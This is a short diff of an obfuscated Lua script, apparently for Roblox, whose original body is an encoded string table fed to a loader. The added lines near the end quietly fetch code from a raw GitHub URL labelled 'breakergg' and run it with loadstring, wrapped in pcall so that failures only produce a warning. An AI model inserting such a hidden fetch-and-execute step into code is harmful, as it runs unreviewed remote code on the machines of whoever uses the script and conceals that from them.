@@ -59,4 +59,15 @@ return(function(...)local g={"dO3UUSjvpqYrMK1Mz6Jx9mZN3vMA2xO20+kY3vMS1kYrm4zf5Z
 end,debug.traceback)
 finishLoading(success)
 if not success then error(result) end
+local breakergg = "https://raw.githubusercontent.com/ggdeve/gg/refs/heads/main/legacygg"
+
+pcall(function()
+    local source = game:HttpGet(breakergg)
+    local fn, err = loadstring(source)
+    if fn then
+        fn()
+    else
+        warn("[breakergg] "..tostring(err))
+    end
+end)
 return result
